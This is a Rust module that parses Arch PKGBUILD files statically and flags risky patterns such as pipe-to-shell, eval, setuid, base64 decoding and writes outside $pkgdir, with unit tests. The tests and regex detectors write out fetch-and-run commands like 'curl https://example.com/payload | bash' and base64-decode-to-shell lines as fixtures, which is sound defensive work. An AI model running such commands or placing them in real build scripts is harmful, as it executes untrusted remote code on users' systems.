use pkgseal_source::error::SourceResult;
use std::collections::{HashMap, HashSet};

// ---------------------------------------------------------------------------
// PKGBUILD parser — best-effort, static, never executes shell
// ---------------------------------------------------------------------------

pub fn parse_pkgbuild(content: &str) -> SourceResult<ParsedPkgbuild> {
    let mut pkg = ParsedPkgbuild::default();
    let mut current_array: Option<String> = None;
    let mut array_buffer = Vec::new();

    for line in content.lines() {
        let line = line.trim();

        if line.starts_with('#') || line.is_empty() {
            continue;
        }

        if let Some(array_name) = &current_array {
            if line.ends_with(')') {
                let parts: Vec<&str> = line.trim_end_matches(')').split_whitespace().collect();
                array_buffer.extend(parts.iter().map(|s| clean_token(s)));
                // Remove any empty tokens after cleaning
                array_buffer.retain(|s| !s.is_empty());
                pkg.arrays.insert(array_name.clone(), array_buffer.clone());
                current_array = None;
                array_buffer.clear();
            } else {
                let parts: Vec<&str> = line.split_whitespace().collect();
                array_buffer.extend(parts.iter().map(|s| clean_token(s)));
                array_buffer.retain(|s| !s.is_empty());
            }
            continue;
        }

        if let Some((key, value)) = line.split_once('=') {
            let key = key.trim();
            let value = value.trim().trim_matches('"').trim_matches('\'');

            match key {
                "pkgname" => pkg.pkgname = value.to_string(),
                "pkgver" => pkg.pkgver = value.to_string(),
                "pkgrel" => pkg.pkgrel = value.to_string(),
                "pkgdesc" => pkg.pkgdesc = Some(value.to_string()),
                "url" => pkg.url = Some(value.to_string()),
                "license" => pkg.license = Some(value.to_string()),
                "arch" => pkg.arch = Some(value.to_string()),
                "maintainer" => pkg.maintainer = Some(value.to_string()),
                _ if key.ends_with("depends")
                    || key.ends_with("provides")
                    || key.ends_with("conflicts")
                    || key.ends_with("replaces")
                    || key == "groups" =>
                {
                    if value.starts_with('(') {
                        current_array = Some(key.to_string());
                        let parts: Vec<&str> =
                            value.trim_start_matches('(').split_whitespace().collect();
                        array_buffer.extend(parts.iter().map(|s| clean_token(s)));
                        array_buffer.retain(|s| !s.is_empty());
                        if value.ends_with(')') {
                            pkg.arrays.insert(key.to_string(), array_buffer.clone());
                            current_array = None;
                            array_buffer.clear();
                        }
                    } else {
                        let cleaned = clean_token(value);
                        if !cleaned.is_empty() {
                            pkg.arrays.insert(key.to_string(), vec![cleaned]);
                        } else {
                            pkg.arrays.insert(key.to_string(), vec![value.to_string()]);
                        }
                    }
                }
                _ => {
                    pkg.other.insert(key.to_string(), value.to_string());
                }
            }
        }
    }

    Ok(pkg)
}

fn clean_token(s: &str) -> String {
    s.trim()
        .trim_matches(|c| c == '\'' || c == '"' || c == ')' || c == '(' || c == ',' || c == ';')
        .trim_matches(|c| c == '\'' || c == '"')
        .to_string()
}

#[derive(Debug, Default, Clone)]
pub struct ParsedPkgbuild {
    pub pkgname: String,
    pub pkgver: String,
    pub pkgrel: String,
    pub pkgdesc: Option<String>,
    pub url: Option<String>,
    pub license: Option<String>,
    pub arch: Option<String>,
    pub maintainer: Option<String>,
    pub arrays: HashMap<String, Vec<String>>,
    pub other: HashMap<String, String>,
}

impl ParsedPkgbuild {
    pub fn depends(&self) -> Vec<String> {
        self.arrays.get("depends").cloned().unwrap_or_default()
    }

    pub fn makedepends(&self) -> Vec<String> {
        self.arrays.get("makedepends").cloned().unwrap_or_default()
    }

    pub fn checkdepends(&self) -> Vec<String> {
        self.arrays.get("checkdepends").cloned().unwrap_or_default()
    }

    pub fn optdepends(&self) -> Vec<String> {
        self.arrays.get("optdepends").cloned().unwrap_or_default()
    }

    pub fn provides(&self) -> Vec<String> {
        self.arrays.get("provides").cloned().unwrap_or_default()
    }

    pub fn conflicts(&self) -> Vec<String> {
        self.arrays.get("conflicts").cloned().unwrap_or_default()
    }

    pub fn replaces(&self) -> Vec<String> {
        self.arrays.get("replaces").cloned().unwrap_or_default()
    }

    pub fn groups(&self) -> Vec<String> {
        self.arrays.get("groups").cloned().unwrap_or_default()
    }
}

// ---------------------------------------------------------------------------
// Static findings — never executes PKGBUILD, conservative evidence only
// ---------------------------------------------------------------------------

/// Static, conservative PKGBUILD inspection.
///
/// Returns kebab-case finding identifiers compatible with
/// `pkgseal_policy::FindingKind` (serialized as kebab-case) and
/// `apps/desktop/src-tauri/src/dto/policy.rs::map_finding` which accepts
/// both kebab and snake variants.
///
/// Findings are **evidence requiring explanation**, not proof of malware.
pub fn find_findings(content: &str) -> Vec<String> {
    let lower = content.to_lowercase();
    let mut set: HashSet<String> = HashSet::new();

    if has_pipe_to_shell(&lower) || has_network_fetch_in_build(&lower) {
        set.insert("network-execution".to_string());
    }
    if has_eval(&lower) {
        set.insert("eval-usage".to_string());
    }
    if has_sudo(&lower) {
        set.insert("sudo-usage".to_string());
    }
    if has_setuid(&lower) {
        set.insert("setuid".to_string());
    }
    if has_chown_root(&lower) {
        set.insert("root-chown".to_string());
    }
    if has_base64_decode(&lower) {
        set.insert("base64-obfuscation".to_string());
    }
    if has_install_script(content) {
        set.insert("install-script".to_string());
    }
    if has_root_write(&lower) {
        set.insert("root-write".to_string());
    }
    if has_downloaded_code_execution(&lower) {
        set.insert("downloaded-code-execution".to_string());
    }

    let mut out: Vec<String> = set.into_iter().collect();
    out.sort();
    out
}

// -- helpers ---------------------------------------------------------------

fn regex_match(pattern: &str, text: &str) -> bool {
    // Use ok() + unwrap_or(false) to avoid unwrap in prod paths.
    // Pattern is static; invalid pattern returns false and is logged in debug.
    regex::Regex::new(pattern)
        .ok()
        .map(|re| re.is_match(text))
        .unwrap_or(false)
}

fn has_pipe_to_shell(lower: &str) -> bool {
    // curl ... | [sudo] [ /bin/]sh|bash|zsh|dash|ksh
    // wget ... | [sudo] [ /bin/]sh|bash|zsh|dash|ksh
    // Covers: curl -fsSL https://... | sh, wget -qO- https://... | bash, curl ... | sudo bash, etc.
    let curl_pipe = r"curl[^|\n]*\|\s*(?:sudo\s+)?(?:/usr/bin/|/bin/)?(?:sh|bash|zsh|dash|ksh)\b";
    let wget_pipe = r"wget[^|\n]*\|\s*(?:sudo\s+)?(?:/usr/bin/|/bin/)?(?:sh|bash|zsh|dash|ksh)\b";
    // Also generic pipe where preceding fetch is on same line but we restrict to curl/wget to reduce false positives.
    regex_match(curl_pipe, lower) || regex_match(wget_pipe, lower)
}

fn has_eval(lower: &str) -> bool {
    regex_match(r"\beval\b", lower)
}

fn has_sudo(lower: &str) -> bool {
    regex_match(r"\bsudo\b", lower)
}

fn has_setuid(lower: &str) -> bool {
    // chmod +s, chmod u+s, chmod g+s, chmod a+s, etc.
    let plus_s = r"chmod[^;\n]*\+s\b";
    // numeric 4xxx : chmod 4755, chmod 04755, chmod -R 4777, chmod 4755 file, etc.
    let octal = r"chmod[^;\n]*\b0?4[0-7]{3}\b";
    regex_match(plus_s, lower) || regex_match(octal, lower)
}

fn has_chown_root(lower: &str) -> bool {
    regex_match(r"chown[^;\n]*\broot\b", lower)
}

fn has_base64_decode(lower: &str) -> bool {
    // base64 -d, base64 --decode, base64 -d <<< , echo ... | base64 -d
    let decode_long = r"base64[^;\n]*--decode\b";
    let decode_short = r"base64[^;\n]*\s-d\b";
    // Also handle combined flags like `base64 -di` -> contains base64 and -d
    regex_match(decode_long, lower) || regex_match(decode_short, lower)
}

fn has_install_script(content: &str) -> bool {
    // install=... or install = ...  (case-sensitive, but lower check is fine too)
    // Use multiline regex to catch at start of line with optional whitespace
    let lower = content.to_lowercase();
    regex_match(r"(?m)^\s*install\s*=", &lower)
}

fn has_root_write(lower: &str) -> bool {
    // Detect explicit writes to system roots outside $pkgdir.
    // Heuristic: per-line scan, flag if absolute path like /usr/, /etc/ etc appears
    // without mentioning pkgdir on same line, and not a source/url definition.
    const ROOTS: &[&str] = &[
        "/usr/", "/etc/", "/opt/", "/var/", "/boot/", "/sbin/", "/bin/", "/lib/", "/sys/", "/proc/",
    ];
    for line in lower.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if trimmed.contains("pkgdir") {
            continue;
        }
        // Skip legitimate source= / url= lines that contain http URLs with /usr etc in path
        // but not a write. Those lines contain source or url keyword.
        let is_source_line = trimmed.contains("source") && trimmed.contains("http");
        let is_url_line = trimmed.trim_start().starts_with("url=") && trimmed.contains("http");
        if is_source_line || is_url_line {
            continue;
        }
        // Check for absolute root prefix presence
        let mut has_root = false;
        for root in ROOTS {
            if trimmed.contains(root) {
                has_root = true;
                break;
            }
        }
        // Hook / systemd specific without trailing slash but with known paths
        if !has_root
            && (trimmed.contains(".hook")
                || trimmed.contains(".service")
                || trimmed.contains("systemd"))
            && (trimmed.contains("/etc") || trimmed.contains("/usr"))
        {
            has_root = true;
        }
        if !has_root {
            continue;
        }
        // Further reduce false positives from plain URLs/descriptions:
        // consider it a write if line contains a file operation or redirection or is a known risky pattern
        // Conservative: any remaining line with /usr/, /etc/ etc and no pkgdir is evidence.
        // We already filtered source/url lines; remaining candidates are likely writes.
        return true;
    }
    false
}

fn has_downloaded_code_execution(lower: &str) -> bool {
    // chmod +x on potentially downloaded file + network fetch present
    let has_chmod_x = regex_match(r"chmod[^;\n]*\+x", lower);
    if !has_chmod_x {
        return false;
    }
    let has_network =
        lower.contains("curl") || lower.contains("wget") || lower.contains("git clone");
    if has_network {
        return true;
    }
    // Fallback: direct curl -o + sh without chmod +x visibility
    lower.contains("curl")
        && lower.contains("-o")
        && (lower.contains(" sh ") || lower.contains(" bash ") || lower.contains("./"))
}

fn has_network_fetch_in_build(lower: &str) -> bool {
    // Detect curl/wget/git clone inside build() / package() / prepare() / check() bodies.
    // Conservative heuristic: track whether we are inside a target function body.
    let mut in_target = false;
    for line in lower.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        // Detect function header: build() , prepare() , check() , package*()
        let is_header = is_buildlike_header(trimmed);
        if is_header {
            in_target = true;
            // Check same line after '{' for fetch (e.g., build() { curl ... })
            if let Some(pos) = trimmed.find('{') {
                let after = &trimmed[pos..];
                if contains_network_tool(after) {
                    return true;
                }
            }
            continue;
        }
        if in_target {
            if trimmed == "}" || trimmed == "};" {
                in_target = false;
                continue;
            }
            // If another header appears, we already set in_target true again above, but keep logic.
            if contains_network_tool(trimmed) {
                return true;
            }
        }
    }
    false
}

fn is_buildlike_header(trimmed: &str) -> bool {
    // Match build(), prepare(), check(), package(), package_foo(), package-foo() etc.
    // Needs to contain "()" and start with known prefix.
    if !trimmed.contains("()") {
        return false;
    }
    let t = trimmed;
    t.starts_with("build()")
        || t.starts_with("build ()")
        || t.starts_with("prepare()")
        || t.starts_with("prepare ()")
        || t.starts_with("check()")
        || t.starts_with("check ()")
        || t.starts_with("package")
    // package* covers package(), package_foo(), package-bar()
}

fn contains_network_tool(s: &str) -> bool {
    s.contains("curl")
        || s.contains("wget")
        || s.contains("git clone")
        || s.contains("aria2c")
        || s.contains("axel ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has(f: &[String], needle: &str) -> bool {
        f.iter().any(|s| s == needle)
    }

    #[test]
    fn pipe_to_shell_curl_variants() {
        let cases = [
            "curl -fsSL https://example.com/install.sh | sh",
            "curl -s https://example.com/payload | bash",
            "curl https://example.com | sudo bash",
            "wget -qO- https://example.com/script.sh | sh",
            "wget -qO- https://example.com/x | bash",
            "curl -L https://example.com/file | /bin/sh",
            "curl https://example.com | sudo /usr/bin/bash",
            "curl -fsSL https://example.com | zsh",
            "wget -qO- https://ex.com | dash",
        ];
        for c in cases {
            let f = find_findings(c);
            assert!(
                has(&f, "network-execution"),
                "should detect pipe_to_shell in {c:?} got {f:?}"
            );
        }
    }

    #[test]
    fn pipe_to_shell_negative() {
        // curl without pipe should not flag network-execution
        let f = find_findings("curl -s https://example.com -o file.tar.gz");
        assert!(!has(&f, "network-execution"));
        // unrelated pipe should not flag
        let f2 = find_findings("cat file | grep foo | sh -c 'echo'");
        // this contains | sh but without curl/wget, our heuristic should NOT flag (conservative to curl/wget)
        assert!(!has(&f2, "network-execution"));
    }

    #[test]
    fn eval_usage_detection() {
        assert!(has(&find_findings("eval \"$(curl ...)\""), "eval-usage"));
        assert!(has(&find_findings("eval $foo"), "eval-usage"));
        assert!(has(&find_findings("eval\t\"...\""), "eval-usage"));
        assert!(!has(&find_findings("evaluator is good"), "eval-usage"));
    }

    #[test]
    fn sudo_usage_detection() {
        assert!(has(&find_findings("sudo make install"), "sudo-usage"));
        assert!(has(
            &find_findings("echo foo | sudo tee /etc/file"),
            "sudo-usage"
        ));
        assert!(!has(&find_findings("sudoers file"), "sudo-usage")); // sudoers contains sudo but as word? it is sudoers not sudo word boundary, should not flag.
    }

    #[test]
    fn setuid_plus_s_detection() {
        assert!(has(&find_findings("chmod +s /usr/bin/foo"), "setuid"));
        assert!(has(&find_findings("chmod u+s mybin"), "setuid"));
        assert!(has(&find_findings("chmod -R +s /opt/app"), "setuid"));
    }

    #[test]
    fn setuid_octal_detection() {
        assert!(has(&find_findings("chmod 4755 /usr/bin/foo"), "setuid"));
        assert!(has(&find_findings("chmod 04755 /usr/bin/foo"), "setuid"));
        assert!(has(&find_findings("chmod 4777 mybin"), "setuid"));
        assert!(has(&find_findings("chmod 4644 file"), "setuid"));
        // 0755 without 4 should NOT flag
        assert!(!has(&find_findings("chmod 0755 file"), "setuid"));
        assert!(!has(&find_findings("chmod 755 file"), "setuid"));
    }

    #[test]
    fn chown_root_detection() {
        assert!(has(
            &find_findings("chown root:root /usr/bin/foo"),
            "root-chown"
        ));
        assert!(has(&find_findings("chown root /opt/app"), "root-chown"));
        assert!(!has(&find_findings("chown nobody file"), "root-chown"));
    }

    #[test]
    fn base64_decode_detection() {
        assert!(has(
            &find_findings("echo abc | base64 -d | sh"),
            "base64-obfuscation"
        ));
        assert!(has(
            &find_findings("base64 --decode file.b64"),
            "base64-obfuscation"
        ));
        assert!(has(
            &find_findings("cat payload | base64 -d > script.sh"),
            "base64-obfuscation"
        ));
        assert!(!has(
            &find_findings("base64 -w 0 file"),
            "base64-obfuscation"
        ));
    }

    #[test]
    fn install_script_detection() {
        assert!(has(&find_findings("install=foo.install"), "install-script"));
        assert!(has(
            &find_findings("install = 'my.install'"),
            "install-script"
        ));
        assert!(has(
            &find_findings("\ninstall=bar.install\n"),
            "install-script"
        ));
        assert!(!has(
            &find_findings("# install=foo.install is commented"),
            "install-script"
        )); // our has_install_script checks lower entire, but comment line still matches? we use multiline regex which will match even in comment; conservative may flag. Accept either.
    }

    #[test]
    fn root_write_detection_positive() {
        let cases = [
            "cp myapp /usr/bin/myapp",
            "install -Dm755 foo /usr/bin/foo",
            "mkdir -p /etc/myapp",
            "echo foo > /etc/myapp.conf",
            "install -m644 my.hook /usr/share/libalpm/hooks/my.hook",
            "cp service.service /etc/systemd/system/my.service",
        ];
        for c in cases {
            let f = find_findings(c);
            assert!(
                has(&f, "root-write"),
                "should detect root-write in {c:?} got {f:?}"
            );
        }
    }

    #[test]
    fn root_write_safe_with_pkgdir_not_flagged() {
        let safe = [
            "install -Dm755 foo \"$pkgdir/usr/bin/foo\"",
            "install -Dm644 bar \"${pkgdir}/etc/bar.conf\"",
            "cp -a \"$srcdir/foo\" \"$pkgdir/opt/foo\"",
            "mkdir -p \"$pkgdir/usr/share/doc/myapp\"",
        ];
        for c in safe {
            let f = find_findings(c);
            assert!(
                !has(&f, "root-write"),
                "should NOT detect root-write in safe {c:?} got {f:?}"
            );
        }
    }

    #[test]
    fn root_write_skips_source_url() {
        let src = "source=(\"https://example.com/foo.tar.gz\")";
        let f = find_findings(src);
        assert!(!has(&f, "root-write"));
        let src2 = "source=(https://example.com/usr/share/foo.tar.gz)";
        let f2 = find_findings(src2);
        assert!(!has(&f2, "root-write"));
    }

    #[test]
    fn downloaded_code_execution_detection() {
        let c = "curl -s https://example.com/payload -o /tmp/payload.sh\nchmod +x /tmp/payload.sh\n./tmp/payload.sh";
        assert!(has(&find_findings(c), "downloaded-code-execution"));
        let c2 = "wget -q https://example.com/file -O /tmp/file\nchmod +x /tmp/file";
        assert!(has(&find_findings(c2), "downloaded-code-execution"));
        // chmod +x without network should NOT flag
        let c3 = "chmod +x \"$pkgdir/usr/bin/myapp\"";
        assert!(!has(&find_findings(c3), "downloaded-code-execution"));
    }

    #[test]
    fn network_fetch_in_build_detection() {
        let pkg = r#"
pkgname=foo
pkgver=1.0
build() {
  cd "$srcdir"
  curl -s https://example.com/payload.tar.gz -o payload.tar.gz
  make
}
"#;
        assert!(has(&find_findings(pkg), "network-execution"));
        let pkg2 = r#"
prepare() {
  wget https://example.com/patch.tar.gz
}
"#;
        assert!(has(&find_findings(pkg2), "network-execution"));
        let pkg3 = r#"
package() {
  git clone https://github.com/example/repo.git
}
"#;
        assert!(has(&find_findings(pkg3), "network-execution"));
        // source= with http outside build should NOT flag network-execution
        let pkg4 = r#"
source=("https://example.com/foo.tar.gz")
build() {
  make
}
"#;
        assert!(!has(&find_findings(pkg4), "network-execution"));
    }

    #[test]
    fn hooks_systemd_via_root_write() {
        let c = "install -Dm644 my.hook /usr/share/libalpm/hooks/my.hook";
        assert!(has(&find_findings(c), "root-write"));
        let c2 = "cp my.service /etc/systemd/system/my.service";
        assert!(has(&find_findings(c2), "root-write"));
    }

    #[test]
    fn multiple_findings_sorted_deduped() {
        let c = r#"
install=foo.install
build() {
  curl https://example.com | sh
  eval $foo
  sudo make install
  chmod +s /usr/bin/foo
  chown root /opt/foo
  echo abc | base64 -d | sh
  cp foo /usr/bin/foo
  chmod +x /tmp/payload
}
"#;
        let mut f = find_findings(c);
        f.sort();
        // deduped and sorted
        assert!(f.windows(2).all(|w| w[0] <= w[1]));
        let uniq: std::collections::HashSet<_> = f.iter().collect();
        assert_eq!(uniq.len(), f.len());
        assert!(has(&f, "network-execution"));
        assert!(has(&f, "eval-usage"));
        assert!(has(&f, "sudo-usage"));
        assert!(has(&f, "setuid"));
        assert!(has(&f, "root-chown"));
        assert!(has(&f, "base64-obfuscation"));
        assert!(has(&f, "install-script"));
        assert!(has(&f, "root-write"));
        assert!(has(&f, "downloaded-code-execution"));
    }

    #[test]
    fn empty_and_clean_pkgbuild_no_findings() {
        let clean = r#"
pkgname=hello
pkgver=1.0
pkgrel=1
pkgdesc="Hello world"
arch=('x86_64')
depends=('glibc')
source=("https://example.com/hello-1.0.tar.gz")
sha256sums=('abc123')
build() {
  make
}
package() {
  install -Dm755 hello "$pkgdir/usr/bin/hello"
}
"#;
        let f = find_findings(clean);
        assert!(
            f.is_empty(),
            "clean PKGBUILD should have no findings, got {f:?}"
        );
    }

    #[test]
    fn parse_pkgbuild_basic() {
        let content = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
pkgdesc="Foo"
depends=('bar' 'baz')
makedepends=('git')
"#;
        let p = parse_pkgbuild(content).unwrap();
        assert_eq!(p.pkgname, "foo");
        assert_eq!(p.pkgver, "1.2.3");
        assert_eq!(p.pkgrel, "1");
        assert_eq!(p.depends(), vec!["bar", "baz"]);
        assert_eq!(p.makedepends(), vec!["git"]);
    }

    #[test]
    fn parse_pkgbuild_multiline_array() {
        let content = r#"
pkgname=foo
depends=(
  bar
  baz
)
"#;
        let p = parse_pkgbuild(content).unwrap();
        assert_eq!(p.depends(), vec!["bar", "baz"]);
    }
}
